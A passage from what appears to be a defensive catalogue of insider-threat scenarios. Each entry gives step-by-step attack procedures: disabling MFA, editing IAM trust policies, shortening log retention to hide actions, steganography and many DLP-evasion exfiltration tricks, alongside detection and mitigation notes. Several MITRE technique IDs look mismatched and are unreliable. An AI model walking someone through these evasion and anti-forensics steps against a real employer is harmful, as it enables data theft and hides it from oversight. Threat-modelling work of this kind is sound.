- **Scenario**: Employee accesses cloud API logs to reconstruct how internal apps function and locate data leaks.
- **Attack Steps**: Step 1: Insider accesses API Gateway logs in AWS Console.Step 2: Searches for endpoint patterns like /api/customerData, /admin/deleteUser.Step 3: Collects request/response pairs showing parameters and returned fields.Step 4: Documents internal business logic.Step 5: Uses this knowledge to craft queries or share app logic externally.
- **Detection**: Log access detection
- **Solution**: Mask sensitive data in logs, restrict visibility
- **Tags**: api, logs, app logic, leak

## Disabling MFA Before Exit

- **Attack Type**: Privilege Abuse
- **Target**: Cloud IAM
- **Vulnerability**: Lack of alert on MFA disable
- **MITRE**: T1556.004 - Modify Authentication Process
- **Impact**: Persistent access after resignation
- **Tools**: Admin Portal (e.g., Azure AD, Okta)
- **Scenario**: Just before resigning, insider disables MFA on their account to retain cloud access.
- **Attack Steps**: Step 1: Insider logs into IAM dashboard with admin privileges.Step 2: Navigates to MFA settings for their user.Step 3: Disables or deletes MFA device.Step 4: Logs out and exits company.Step 5: Later reuses saved credentials to login without MFA.
- **Detection**: IAM audit logs, alert on MFA config
- **Solution**: Enforce just-in-time MFA, log all changes
- **Tags**: mfa, iam, persistence, insider

## Tampering With IAM Roles to Create Shadow Access

- **Attack Type**: Role Escalation
- **Target**: Cloud IAM Roles
- **Vulnerability**: Misconfigured trust policies
- **MITRE**: T1098.001 - Account Manipulation: Additional Roles
- **Impact**: Shadow access, lateral movement
- **Tools**: AWS IAM / GCP IAM
- **Scenario**: Insider modifies existing IAM roles to silently grant themselves access to restricted services.
- **Attack Steps**: Step 1: Insider logs into IAM management console.Step 2: Finds low-profile role (e.g., developer-readonly).Step 3: Edits trust policy to include their own user.Step 4: Assumes role using CLI and gains read/write access.Step 5: Remains hidden under legitimate role usage.
- **Detection**: IAM role usage logs, assume role history
- **Solution**: Enable least privilege, monitor trust policy edits
- **Tags**: iam, role abuse, shadowaccess

## Embedding Sensitive Data in Image Metadata

- **Attack Type**: Steganography
- **Target**: File Transfer
- **Vulnerability**: No DLP for metadata
- **MITRE**: T1027 - Obfuscated Files or Information
- **Impact**: Covert data exfiltration
- **Tools**: Image editor (e.g., Photoshop, ExifTool)
- **Scenario**: Insider hides sensitive project notes inside image file metadata and uploads to personal cloud.
- **Attack Steps**: Step 1: Insider opens a stock image in an editor.Step 2: Edits EXIF metadata fields like "Description", inserting internal meeting notes.Step 3: Saves the image.Step 4: Uploads it to personal Google Drive or shares via WhatsApp.Step 5: The data is hidden from normal view but recoverable by metadata tools.
- **Detection**: Metadata scanners, stego detection
- **Solution**: Strip metadata, restrict unknown uploads
- **Tags**: image, stego, metadata, covert

## Insider Changes Email Rules to Divert Invoices

- **Attack Type**: Financial Fraud
- **Target**: Cloud Email
- **Vulnerability**: Poor email rule audits
- **MITRE**: T1114 - Email Collection
- **Impact**: Invoice fraud or delay
- **Tools**: Outlook 365 / Gmail
- **Scenario**: Employee sets up rules in cloud mail to move all invoice emails to hidden folder, delaying payments.
- **Attack Steps**: Step 1: Logs into corporate Outlook 365.Step 2: Goes to “Rules” and creates one: “If subject has invoice, move to folder Hidden”.Step 3: Vendor emails go unseen by finance team.Step 4: Insider deletes or edits invoices.Step 5: May insert fake payment details and forward.
- **Detection**: Mail rules logs, missing emails
- **Solution**: Email rule restrictions, invoice validation workflows
- **Tags**: outlook, invoice, fraud, emailrule

## Insider Using Misconfigured SaaS Logs for Recon

- **Attack Type**: Information Disclosure
- **Target**: CRM Logs
- **Vulnerability**: Over-permissive log access
- **MITRE**: T1087.002 - Account Discovery
- **Impact**: Competitive leakage
- **Tools**: Salesforce, HubSpot, or CRM logs
- **Scenario**: Insider views detailed SaaS app logs (e.g., Salesforce) showing client interactions and leads.
- **Attack Steps**: Step 1: Logs into CRM with support or sales-level access.Step 2: Navigates to audit logs section.Step 3: Searches for other teams’ activities like “Lead conversations” or “Deal closing rates”.Step 4: Copies or exports key data.Step 5: Uses this to apply to competitor or resell info.
- **Detection**: CRM log download tracking
- **Solution**: Role-based access, restrict cross-team views
- **Tags**: crm, salesforce, recon, leak

## Using Developer Console to Extract Tokenized Data

- **Attack Type**: Token Bypass
- **Target**: Cloud Web App
- **Vulnerability**: Weak tokenization
- **MITRE**: T1557.002 - Man-in-the-Middle
- **Impact**: Payment data theft
- **Tools**: Browser DevTools
- **Scenario**: Insider uses browser DevTools to capture tokenized payment/card info and reverse it manually.
- **Attack Steps**: Step 1: Opens web app (e.g., internal payment portal).Step 2: Opens Chrome DevTools (F12).Step 3: Navigates to Network tab, watches payment request payloads.Step 4: Identifies token IDs and maps responses.Step 5: If backend isn’t securely masking data, gets original card info.
- **Detection**: Token vault logs, browser activity
- **Solution**: Secure tokens, never expose raw tokens in frontend
- **Tags**: devtools, token, browser, payment

## Insider Exporting Cloud Email Contacts

- **Attack Type**: Contact Exfiltration
- **Target**: Cloud Mail
- **Vulnerability**: Unrestricted contact exports
- **MITRE**: T1114.001 - Local Email Collection
- **Impact**: Loss of client/partner contact base
- **Tools**: Gmail/Outlook export tool
- **Scenario**: Employee exports all business contacts to CSV and uploads to personal email.
- **Attack Steps**: Step 1: Insider opens their work Gmail or Outlook.Step 2: Goes to “Contacts” section and selects “Export All”.Step 3: Saves file as .CSV.Step 4: Opens personal Gmail tab and attaches file.Step 5: Sends to personal inbox or USB.
- **Detection**: Contact export logs
- **Solution**: Restrict exports, use alerts for downloads
- **Tags**: contacts, gmail, csv, insider

## Changing Calendar Permissions to Spy on Meetings

- **Attack Type**: Surveillance
- **Target**: Shared Calendar
- **Vulnerability**: Weak permission settings
- **MITRE**: T1213.001 - Data from Information Repositories: Shared Calendars
- **Impact**: Insider monitoring
- **Tools**: Google Calendar / Outlook Calendar
- **Scenario**: Insider changes calendar sharing settings to secretly view HR or finance meetings.
- **Attack Steps**: Step 1: Logs into corporate calendar platform.Step 2: Navigates to HR team’s calendar link (shared internally).Step 3: Changes visibility from “Free/Busy” to “See all event details”.Step 4: Views meeting topics, attendees, Zoom links.Step 5: Uses data to snoop or join uninvited.
- **Detection**: Calendar audit logs, unknown join alerts
- **Solution**: Limit calendar visibility, enable meeting security
- **Tags**: calendar, spy, zoom, visibility

## Insider Reusing SSO Session via Browser Backup

- **Attack Type**: Session Hijack
- **Target**: Browser-based SSO
- **Vulnerability**: Session cookie persistence
- **MITRE**: T1550.002 - Use of Web Session Cookie
- **Impact**: Access without re-authentication
- **Tools**: Chrome/Firefox
- **Scenario**: Insider uses exported browser profile backup from office PC to regain access at home.
- **Attack Steps**: Step 1: On office PC, insider uses sync or exports Chrome user profile (includes session cookies).Step 2: Saves backup to USB.Step 3: At home, imports profile into Chrome.Step 4: Opens corporate web apps (SSO bypassed using cookies).Step 5: Browses internal apps without MFA.
- **Detection**: Endpoint DLP, browser audit tools
- **Solution**: Invalidate sessions after export
- **Tags**: browser, sso, session, cookie

## Insider Uploading Watermarked Files to Forums

- **Attack Type**: Branding Attack
- **Target**: Internal Documents
- **Vulnerability**: Document watermark leakage
- **MITRE**: T1119 - Automated Collection
- **Impact**: Brand or PR damage
- **Tools**: Reddit, Pastebin, anonymous forums
- **Scenario**: Insider subtly uploads watermarked or confidential files to public forums for sabotage.
- **Attack Steps**: Step 1: Downloads internal PDF with watermark like “Confidential - Company X”.Step 2: Creates anonymous account on Pastebin or Reddit.Step 3: Posts snippets or uploads file disguised as “open source reference”.Step 4: Links begin circulating online.Step 5: Company image is damaged.
- **Detection**: Web crawlers, DLP reverse lookup
- **Solution**: Watermark tracking, disable downloads
- **Tags**: pastebin, watermark, leak

## Modifying Cloud DNS to Redirect Domains

- **Attack Type**: DNS Manipulation
- **Target**: DNS Zone
- **Vulnerability**: Unreviewed DNS changes
- **MITRE**: T1565.001 - DNS Manipulation
- **Impact**: Phishing, redirection
- **Tools**: Cloudflare, AWS Route53
- **Scenario**: Cloud admin changes DNS entries to redirect a subdomain to malicious external IP.
- **Attack Steps**: Step 1: Insider logs into DNS management console.Step 2: Selects internal subdomain (e.g., intranet.company.com).Step 3: Edits A or CNAME record to point to attacker server IP.Step 4: Employees using the domain are redirected.Step 5: Data can be intercepted or credentials harvested.
- **Detection**: DNS audit logs, redirect detection
- **Solution**: Use DNS change approvals
- **Tags**: dns, redirect, cloudflare, route53

## Insider Alters Retention Policies to Delete Logs

- **Attack Type**: Log Evasion
- **Target**: Cloud Audit Logs
- **Vulnerability**: Log tampering
- **MITRE**: T1562.002 - Disable or Modify Tools
- **Impact**: Anti-forensics
- **Tools**: GCP Logging / AWS CloudWatch
- **Scenario**: Employee modifies cloud logging retention to auto-delete logs of unauthorized actions.
- **Attack Steps**: Step 1: Insider accesses logging console.Step 2: Edits log group retention to 1 day (from 30 days).Step 3: Performs suspicious actions: snapshotting, permission changes.Step 4: Waits for logs to expire and auto-delete.Step 5: Leaves no trace of activity.
- **Detection**: Logging config history
- **Solution**: Lock retention policies, alert on changes
- **Tags**: logging, retention, cloudwatch

## USB Data Exfiltration Despite DLP

- **Attack Type**: Data Theft
- **Target**: Endpoint
- **Vulnerability**: Weak USB policy, DLP misconfig
- **MITRE**: T1020 (Automated Exfiltration)
- **Impact**: Data leakage
- **Tools**: USB drive, Notepad, PrintScreen
- **Scenario**: Employee copies sensitive data using an allowed USB device, avoiding DLP policies using document screenshots and renamed files.
- **Attack Steps**: Step 1: Insider brings a personal USB drive labeled as “Keyboard” or “Phone Charger” to bypass USB restrictions.Step 2: Opens sensitive documents on-screen and takes screenshots using PrintScreen key.Step 3: Pastes screenshots into a Word or Paint file.Step 4: Saves the file as "Holiday_Photos.docx".Step 5: Transfers it to the USB and walks out.
- **Detection**: USB logs, DLP alerts, behavior monitoring
- **Solution**: Disable USBs completely or use device whitelisting. Use OCR-aware DLP.
- **Tags**: #usb #dataexfil #dlpbypass

## Cloud Sync to Personal Drive

- **Attack Type**: Data Exfiltration
- **Target**: Web App
- **Vulnerability**: No cloud-blocking DLP
- **MITRE**: T1537 (Transfer Data to Cloud)
- **Impact**: IP leakage
- **Tools**: Browser, Google Drive, Dropbox
- **Scenario**: Employee uses allowed browser to log into a personal Google Drive or Dropbox account and uploads sensitive files.
- **Attack Steps**: Step 1: Employee opens Chrome (whitelisted browser).Step 2: Logs into personal Google Drive using incognito mode.Step 3: Selects critical internal PDF reports.Step 4: Drags and drops them into the cloud storage window.Step 5: Deletes browser history and cookies.
- **Detection**: Monitor outbound HTTPS, CASB logs
- **Solution**: Block personal cloud via web proxy, use Cloud DLP
- **Tags**: #cloudexfil #googledrive #dlpbypass

## Emailing Stego Files

- **Attack Type**: Steganography
- **Target**: Email
- **Vulnerability**: Lack of stego detection
- **MITRE**: T1027.003 (Steganography)
- **Impact**: Hidden data exfiltration
- **Tools**: Steghide, Email, JPEG image
- **Scenario**: Insider hides sensitive text inside an image and emails it to a personal email account, avoiding DLP.
- **Attack Steps**: Step 1: Employee writes sensitive project data in Notepad.Step 2: Uses tool like Steghide to embed the text into a cat image.Step 3: Opens Gmail and attaches the image.Step 4: Emails it to their personal Gmail account.Step 5: Clears local logs and stego tool.
- **Detection**: Email filter logs, anomaly detection
- **Solution**: Use stego-aware DLP and block file attachment types
- **Tags**: #stego #email #dlpbypass

## Screen Sharing to Exfiltrate Data

- **Attack Type**: Remote Desktop Abuse
- **Target**: Endpoint
- **Vulnerability**: Allowed screen sharing
- **MITRE**: T1219 (Remote Access Tools)
- **Impact**: Visual data leak
- **Tools**: Zoom, AnyDesk, Screenshare
- **Scenario**: Insider shares desktop using Zoom or AnyDesk to show sensitive info to an outsider and bypass DLP systems.
- **Attack Steps**: Step 1: Insider installs Zoom or uses browser version.Step 2: Joins a meeting with attacker outside company.Step 3: Shares screen showing internal CRM or sensitive emails.Step 4: Attacker takes screenshots or records the meeting.Step 5: Insider closes session and deletes Zoom history.
- **Detection**: Monitor remote access, screen recording logs
- **Solution**: Block screen sharing apps, train users, audit screen time
- **Tags**: #screenshare #zoom #dlpbypass

## Printing Sensitive Docs & Photographing

- **Attack Type**: Physical Exfiltration
- **Target**: Physical Docs
- **Vulnerability**: No print logging or monitoring
- **MITRE**: T1020 + Physical Access
- **Impact**: IP/data theft
- **Tools**: Printer, Smartphone
- **Scenario**: Insider prints internal documents and photographs them using their phone in restrooms or personal bag.
- **Attack Steps**: Step 1: Insider prints confidential design document.Step 2: Goes to a low-surveillance area like restroom.Step 3: Uses mobile phone camera to take photos.Step 4: Destroys printed paper to avoid trace.Step 5: Sends photos via messaging app later.
- **Detection**: Print logs, camera use logs (MDM)
- **Solution**: Watermark printed files, disable print, camera logging
- **Tags**: #physical #printer #dlpbypass

## Renaming Files to Bypass Keyword Detection

- **Attack Type**: DLP Evasion
- **Target**: File Server
- **Vulnerability**: DLP only scans file names or extensions
- **MITRE**: T1565.001 (Archive Collected Data)
- **Impact**: Confidential info leak
- **Tools**: File Explorer, Browser
- **Scenario**: Insider renames sensitive files to look harmless and uploads via allowed channels to bypass DLP filters.
- **Attack Steps**: Step 1: Insider finds financial report (e.g., revenue_Q3.xlsx).Step 2: Renames it to “vacation_list.xlsx”.Step 3: Uploads it through allowed email or Google Drive.Step 4: Deletes browser history and renamed local file.
- **Detection**: File rename tracking, outbound monitoring
- **Solution**: Content-aware DLP, hash-based detection
- **Tags**: #filenameobfuscation #dlpbypass

## Clipboard Hijack with Online Notes

- **Attack Type**: Clipboard Exfiltration
- **Target**: Clipboard
- **Vulnerability**: No clipboard monitoring
- **MITRE**: T1115 (Clipboard Data)
- **Impact**: Covert data transfer
- **Tools**: Clipboard, Browser, Google Keep
- **Scenario**: Insider copies classified text and pastes it into online notes or Google Keep to evade file-based DLP.
- **Attack Steps**: Step 1: Opens document with confidential info.Step 2: Copies paragraph using Ctrl+C.Step 3: Opens Google Keep or Pastebin.Step 4: Pastes data and saves it.Step 5: Logs into personal account and syncs it to mobile.
- **Detection**: Clipboard access logs, web proxy logs
- **Solution**: Block online note-taking apps, monitor clipboard
- **Tags**: #clipboard #dlpbypass #cloudnotes

## Using Browser Developer Tools

- **Attack Type**: DLP Bypass via Inspect
- **Target**: Web App
- **Vulnerability**: No browser-level monitoring
- **MITRE**: T1119 (Automated Collection)
- **Impact**: Extracts hidden/secured data
- **Tools**: Chrome DevTools
- **Scenario**: Insider opens secure apps, uses “Inspect Element” to copy hidden data not directly downloadable, and pastes it elsewhere.
- **Attack Steps**: Step 1: Opens internal HR portal or analytics dashboard.Step 2: Right-clicks data, chooses “Inspect”.Step 3: Expands HTML and copies confidential code/text.Step 4: Pastes into Notepad or Google Docs.Step 5: Sends it to personal email.
- **Detection**: Browser extension audit
- **Solution**: Restrict DevTools, disable right-click on apps
- **Tags**: #inspect #dlpbypass #htmlcopy

## File Compression to Bypass Filters

- **Attack Type**: File Obfuscation
- **Target**: Files
- **Vulnerability**: DLP skips zipped/encrypted files
- **MITRE**: T1022 (Data Encrypted)
- **Impact**: Multi-file leakage
- **Tools**: WinRAR, Email
- **Scenario**: Insider compresses multiple sensitive files into a ZIP file with a misleading name and uploads it.
- **Attack Steps**: Step 1: Selects internal project PDFs.Step 2: Compresses them using WinRAR.Step 3: Names the ZIP as “travel_photos.zip”.Step 4: Attaches it in email to personal account.Step 5: Deletes ZIP from local storage.
- **Detection**: Monitor ZIP uploads
- **Solution**: Block encrypted attachments, scan inside ZIPs
- **Tags**: #zip #dlpbypass #compression

## Screenshot via Remote Session

- **Attack Type**: Screen Capture Exfiltration
- **Target**: Endpoint
- **Vulnerability**: No screen capture control
- **MITRE**: T1113 (Screen Capture)
- **Impact**: Sensitive data leak
- **Tools**: AnyDesk, Snipping Tool
- **Scenario**: Insider takes screenshots of data through remote desktop apps and sends them externally.
- **Attack Steps**: Step 1: Opens internal file on screen.Step 2: Uses Snipping Tool to capture key parts.Step 3: Connects to external AnyDesk session.Step 4: Pastes screenshots into remote window.Step 5: Disconnects and clears logs.
- **Detection**: Screen capture logs, app usage audit
- **Solution**: Block snipping tools, log AnyDesk/remote sessions
- **Tags**: #snip #anydesk #dlpbypass

## Audio Recording of Discussions

- **Attack Type**: Covert Audio Capture
- **Target**: Audio
- **Vulnerability**: No sound monitoring
- **MITRE**: T1123 (Audio Capture)
- **Impact**: Voice/IP leak
- **Tools**: Phone Recorder App
- **Scenario**: Insider records confidential meetings using a phone, bypassing any file or data monitoring.
- **Attack Steps**: Step 1: Attends internal strategic meeting.Step 2: Starts audio recording app on phone.Step 3: Keeps phone on desk silently recording.Step 4: After meeting, sends recording to another person.Step 5: Deletes app logs or names file “Music1”.
- **Detection**: Room sweep, mobile policy enforcement
- **Solution**: Disable phones in sensitive areas, jamming
- **Tags**: #audiocapture #phone #dlpbypass

## Hidden Text in Images (Manual Stego)

- **Attack Type**: Visual Steganography
- **Target**: Image
- **Vulnerability**: DLP skips text in images
- **MITRE**: T1560.002 (Image File Exfil)
- **Impact**: Undetectable data transfer
- **Tools**: Paint, PNG File
- **Scenario**: Insider types sensitive info into Paint, saves it as image, bypassing DLP checks.
- **Attack Steps**: Step 1: Opens MS Paint.Step 2: Types secret information in small white text on white background.Step 3: Saves as “IMG_2025.png”.Step 4: Uploads image to personal Google Drive.Step 5: Shares link with outsider.
- **Detection**: OCR-based monitoring, anomaly alerts
- **Solution**: Enable image OCR in DLP, manual review of images
- **Tags**: #stego #image #paint

## Mobile Hotspot to Evade Network Logs

- **Attack Type**: Network Bypass
- **Target**: Network
- **Vulnerability**: Logs only corporate traffic
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Blind spot for exfiltration
- **Tools**: Mobile Hotspot
- **Scenario**: Insider connects PC to mobile hotspot, avoiding all corporate firewalls and sends data out.
- **Attack Steps**: Step 1: Disconnects from company Wi-Fi.Step 2: Enables phone’s hotspot.Step 3: Connects work laptop to hotspot.Step 4: Emails sensitive files or uses FTP tools.Step 5: Switches back to corporate network later.
- **Detection**: USB tethering logs, endpoint network switching
- **Solution**: Block non-approved networks, disable hotspots
- **Tags**: #networkbypass #mobilehotspot #dlpbypass

## Using WhatsApp Web for File Transfer

- **Attack Type**: Messaging App Abuse
- **Target**: Messaging
- **Vulnerability**: WhatsApp not blocked
- **MITRE**: T1105 (Data Transfer Tools)
- **Impact**: Direct external transmission
- **Tools**: WhatsApp Web, Browser
- **Scenario**: Insider uploads company files using WhatsApp Web to personal contacts.
- **Attack Steps**: Step 1: Opens WhatsApp Web on PC browser.Step 2: Scans QR with phone.Step 3: Uploads document “Marketing2025.pdf”.Step 4: Sends to a trusted contact.Step 5: Clears chat and browser data.
- **Detection**: Proxy logs, WhatsApp domain activity
- **Solution**: Block WhatsApp Web, apply messaging controls
- **Tags**: #whatsapp #filetransfer #dlpbypass

## Printing Encrypted QR Codes

- **Attack Type**: Physical Steganography
- **Target**: Physical
- **Vulnerability**: QR scanning not monitored
- **MITRE**: T1029 (Scheduled Transfer)
- **Impact**: Offline data smuggling
- **Tools**: Online QR Generator
- **Scenario**: Insider generates a QR code containing sensitive text and prints it out for physical exfiltration.
- **Attack Steps**: Step 1: Copies text like “Client Passwords: abc123”.Step 2: Uses online QR code generator.Step 3: Prints QR and sticks it on personal notepad.Step 4: Leaves office with QR unnoticed.Step 5: Later scans QR to extract data.
- **Detection**: Printer logs, QR detection
- **Solution**: Restrict QR use, monitor printed codes
- **Tags**: #qr #print #dlpbypass

## Using ChatGPT or AI Tools to Leak Info

- **Attack Type**: AI Misuse
- **Target**: SaaS App
- **Vulnerability**: AI input monitoring absent
- **MITRE**: T1530 (Data Transfer to Cloud)
- **Impact**: Third-party leak
- **Tools**: ChatGPT, Browser
- **Scenario**: Insider uses ChatGPT or similar AI to summarize and leak sensitive data during conversation.
- **Attack Steps**: Step 1: Opens internal document with financial projections.Step 2: Copies and pastes data into ChatGPT.Step 3: Asks it to "summarize" or "convert to bullet points".Step 4: Copies AI’s response.Step 5: Pastes it into Google Docs or emails it.
- **Detection**: AI activity logging, browser inspection
- **Solution**: Block AI tools or restrict uploads
- **Tags**: #AIleak #chatgpt #dlpbypass

## Shared Calendar Note Leak

- **Attack Type**: Calendar Exploitation
- **Target**: Calendar App
- **Vulnerability**: Calendar descriptions not scanned
- **MITRE**: T1056 (Input Capture)
- **Impact**: Secret info sent covertly
- **Tools**: Outlook, Google Calendar
- **Scenario**: Insider writes sensitive data into shared calendar descriptions visible to personal Gmail or phone.
- **Attack Steps**: Step 1: Creates fake meeting titled “Yoga Class”.Step 2: Writes “Project password: abcd1234” in description.Step 3: Invites personal Gmail to meeting.Step 4: Syncs calendar with mobile.Step 5: Deletes event after exfiltration.
- **Detection**: Calendar API monitoring
- **Solution**: Scrub sensitive terms from calendar fields
- **Tags**: #calendar #meetingleak #dlpbypass

## Base64 Text Encoding in Chat

- **Attack Type**: Obfuscation
- **Target**: Text
- **Vulnerability**: DLP doesn’t decode base64
- **MITRE**: T1140 (Encode Data)
- **Impact**: Encoded data transfer
- **Tools**: Base64 Tool, Notepad
- **Scenario**: Insider converts sensitive info to Base64, pastes in chat apps or email to avoid detection.
- **Attack Steps**: Step 1: Writes text like “Salary for CEO is ₹50L”.Step 2: Uses online tool to encode as Base64.Step 3: Sends it in email body like normal message.Step 4: Attacker decodes it on their side.Step 5: Deletes browser and email history.
- **Detection**: Anomaly detection, base64 scanners
- **Solution**: Scan base64 in transit, alert on weird encodings
- **Tags**: #obfuscation #base64 #dlpbypass

## Smartwatch Screenshot Sync

- **Attack Type**: Wearable Device Abuse
- **Target**: Wearable
- **Vulnerability**: No wearable policy enforcement
- **MITRE**: T1123 (Audio/Visual Capture)
- **Impact**: Unmonitored image exfil
- **Tools**: Smartwatch, Phone
- **Scenario**: Insider captures sensitive screen data using smartwatch synced with mobile.
- **Attack Steps**: Step 1: Opens sensitive spreadsheet on laptop.Step 2: Uses smartwatch camera to take a photo.Step 3: Automatically syncs image to mobile phone.Step 4: Sends image to attacker via WhatsApp.Step 5: Deletes synced data from gallery.
- **Detection**: Watch/MDM device logs
- **Solution**: Block smartwatch pairing, log photo sync
- **Tags**: #smartwatch #wearable #dlpbypass

## Sending Data via Online Forms

- **Attack Type**: Web Form Exfiltration
- **Target**: Web App
- **Vulnerability**: Form fields not monitored
- **MITRE**: T1041 (Exfil Over Web)
- **Impact**: Data sent to unknown third party
- **Tools**: Browser, Typeform
- **Scenario**: Insider fills sensitive content in contact form of an external site like Typeform, bypassing DLP.
- **Attack Steps**: Step 1: Opens external site like "support request form".Step 2: Fills name field with internal passwords.Step 3: Submits form.Step 4: Attacker collects submitted data.Step 5: Insider clears form autofill and browser logs.
- **Detection**: Monitor form submissions, form scraping
- **Solution**: Block external forms in proxy, log key POSTs
- **Tags**: #webform #dlpbypass

## Local Hidden Folder for Later Theft

- **Attack Type**: Hidden Storage
- **Target**: Endpoint
- **Vulnerability**: Local folder not scanned
- **MITRE**: T1564.001 (Hidden Artifacts)
- **Impact**: Deferred data theft
- **Tools**: File Explorer, USB
- **Scenario**: Insider stores data in hidden folder for physical extraction later (e.g., via USB or email).
- **Attack Steps**: Step 1: Copies financial data to a folder named “.syscache”.Step 2: Changes folder to hidden using right-click > Properties.Step 3: Leaves data there for 3 days to avoid suspicion.Step 4: Connects USB and copies files when no one’s around.Step 5: Deletes folder afterward.
- **Detection**: Hidden file scan, endpoint audit
- **Solution**: DLP must scan hidden/system folders
- **Tags**: #localexfil #hiddenfolder #dlpbypass

## Printing Excel with White Fonts

- **Attack Type**: Visual Exfil
- **Target**: Document
- **Vulnerability**: Print DLP doesn’t read fonts
- **MITRE**: T1564 (Hide Artifacts)
- **Impact**: Visual-only theft
- **Tools**: Excel, Printer
- **Scenario**: Insider prints a sheet with white text on white cells — invisible to humans but still printable.
- **Attack Steps**: Step 1: Types credentials in Excel.Step 2: Changes font color to white on white cells.Step 3: Prints the sheet.Step 4: Picks up printout — looks blank but can be scanned.Step 5: Later increases contrast using photo editor.
- **Detection**: Print preview logs, text recognition
- **Solution**: Print auditing + OCR integration
- **Tags**: #printstealth #excel #dlpbypass

## Draft Email Leak via Shared Drafts

- **Attack Type**: Shared Mail Abuse
- **Target**: Webmail
- **Vulnerability**: Drafts not scanned by DLP
- **MITRE**: T1020 + T1114
- **Impact**: Data leak without traffic
- **Tools**: Gmail/Yahoo
- **Scenario**: Insider types data in email draft, shares mailbox login with attacker to view it — without sending anything.
- **Attack Steps**: Step 1: Composes email in Gmail with sensitive data.Step 2: Saves it as draft — doesn’t hit “Send”.Step 3: Shares Gmail login credentials with external contact.Step 4: Other person logs in, reads draft.Step 5: Insider deletes draft after confirmation.
- **Detection**: Detect multi-login, audit drafts
- **Solution**: Alert on draft length/time anomalies
- **Tags**: #emaildraft #nosend #dlpbypass

## Using Free Online Translators

- **Attack Type**: Encoding via Translation
- **Target**: Browser
- **Vulnerability**: Translation not flagged
- **MITRE**: T1105
- **Impact**: Obfuscated text leak
- **Tools**: Google Translate
- **Scenario**: Insider copies text into Google Translate or Bing Translate and saves translated version for later reversal.
- **Attack Steps**: Step 1: Copies internal report paragraph.Step 2: Pastes into Google Translate from English to Korean.Step 3: Copies Korean result and saves in text file.Step 4: Sends file to outsider.Step 5: Attacker reverses translation.
- **Detection**: Log usage of translation tools
- **Solution**: Block translator domains on corp network
- **Tags**: #translator #encode #dlpbypass

## USB Keyboard Emulator (Rubber Ducky)

- **Attack Type**: Hardware Exploit
- **Target**: Hardware
- **Vulnerability**: USB emulation not restricted
- **MITRE**: T1059 (Command Scripting)
- **Impact**: Fast and stealthy data theft
- **Tools**: Rubber Ducky, USB
- **Scenario**: Insider uses Rubber Ducky USB to auto-type & exfiltrate data via command scripts.
- **Attack Steps**: Step 1: Prepares Rubber Ducky with script to open Notepad, copy files, and send via email.Step 2: Inserts device into PC (recognized as keyboard).Step 3: Script auto-types commands, no clicks needed.Step 4: Files are exfiltrated.Step 5: Device is removed within seconds.
- **Detection**: USB HID detection, audit script behavior
- **Solution**: Block unknown HID devices
- **Tags**: #usbkeyboard #rubberducky #dlpbypass

## Using Voice-to-Text to Leak Data

- **Attack Type**: Audio-to-Text Abuse
- **Target**: Audio
- **Vulnerability**: Speech not monitored
- **MITRE**: T1123 (Audio Capture)
- **Impact**: Verbal data leak
- **Tools**: Mobile Phone, Notes App
- **Scenario**: Insider reads sensitive data aloud while using phone’s voice-to-text feature to secretly store or transmit it.
- **Attack Steps**: Step 1: Opens internal document on laptop.Step 2: Activates phone’s voice typing in Notes or WhatsApp.Step 3: Slowly reads out confidential content.Step 4: Text gets converted in real-time.Step 5: Saves or sends the note externally.
- **Detection**: MDM voice usage audit
- **Solution**: Restrict voice input apps
- **Tags**: #voicetotext #audiobypass

## Google Cloud Print to External Printer

- **Attack Type**: Cloud Print Exploit
- **Target**: Print
- **Vulnerability**: Cloud print not monitored
- **MITRE**: T1020
- **Impact**: Physical document exfil
- **Tools**: Google Cloud Print, Printer
- **Scenario**: Insider prints confidential docs directly to personal printer connected via Google Cloud Print.
- **Attack Steps**: Step 1: Opens confidential PDF.Step 2: Chooses “Print” and selects personal cloud printer.Step 3: Sends print job to home printer via cloud.Step 4: Collects document later at home.Step 5: Deletes print history.
- **Detection**: Cloud print logs
- **Solution**: Disable cloud print, allow only corp printers
- **Tags**: #cloudprint #dlpbypass #printleak

## Data Hiding in Spreadsheet Comments

- **Attack Type**: Metadata Abuse
- **Target**: File
- **Vulnerability**: DLP skips metadata/comments
- **MITRE**: T1564 (Hidden Data)
- **Impact**: Covert info exfil
- **Tools**: MS Excel
- **Scenario**: Insider types passwords and confidential info into Excel comment boxes that DLP systems may skip.
- **Attack Steps**: Step 1: Opens Excel sheet for “Project-X”.Step 2: Right-clicks on cells and selects “Insert Comment”.Step 3: Types hidden data like “CEO PW: Abc@123”.Step 4: Saves file and emails it to external party.Step 5: Deletes the original file.
- **Detection**: Metadata scanners
- **Solution**: Scan comments, disable metadata
- **Tags**: #excel #commentleak

## File Sharing via Zoom Chat

- **Attack Type**: Collaboration Tool Exploit
- **Target**: SaaS/Collab App
- **Vulnerability**: Chat file transfers not monitored
- **MITRE**: T1105 (Data Transfer Tools)
- **Impact**: Peer-to-peer leak
- **Tools**: Zoom
- **Scenario**: Insider sends sensitive files via Zoom’s built-in chat feature during meetings.
- **Attack Steps**: Step 1: Joins a Zoom meeting.Step 2: Uses in-meeting chat to upload sensitive files (e.g., HR database).Step 3: Sends file to another user or guest.Step 4: Deletes file from system.Step 5: Leaves meeting after confirmation.
- **Detection**: Zoom chat logs, DLP for collab apps
- **Solution**: Block in-meeting file sharing
- **Tags**: #zoom #chatbypass

## Hiding Data in Code Comments (Git)

- **Attack Type**: Code Repo Abuse
- **Target**: Git/DevOps
- **Vulnerability**: Code comments not scanned
- **MITRE**: T1557
- **Impact**: Data leaked through version control
- **Tools**: Git, Notepad
- **Scenario**: Insider hides confidential data inside code comments before pushing to public or private GitHub repo.
- **Attack Steps**: Step 1: Opens source code file.Step 2: Adds comment like // creds: user=admin pass=123.Step 3: Commits and pushes code to GitHub.Step 4: Attacker clones repo and extracts info.Step 5: Insider deletes local repo copy.
- **Detection**: Git auditing, keyword scan in code
- **Solution**: Scan repos for sensitive keywords
- **Tags**: #git #codeleak #commentabuse

## QR Code Shared Over Zoom Video

- **Attack Type**: Visual Over Screen
- **Target**: Screen
- **Vulnerability**: No OCR on video stream
- **MITRE**: T1560.002
- **Impact**: Real-time visual exfil
- **Tools**: QR Generator, Zoom
- **Scenario**: Insider generates a QR code of sensitive data and shows it on camera during Zoom or Teams call.
- **Attack Steps**: Step 1: Converts text like “VPN login info” into QR using online tool.Step 2: Opens QR image on screen.Step 3: Shares video or screen in Zoom call.Step 4: Attacker scans QR from their screen.Step 5: Insider deletes QR image.
- **Detection**: Screen share audit
- **Solution**: Block screen sharing, use OCR-based DLP
- **Tags**: #qrovervideo #visualleak

## Self-Email via Corp SMTP Abuse

- **Attack Type**: Relay Exploitation
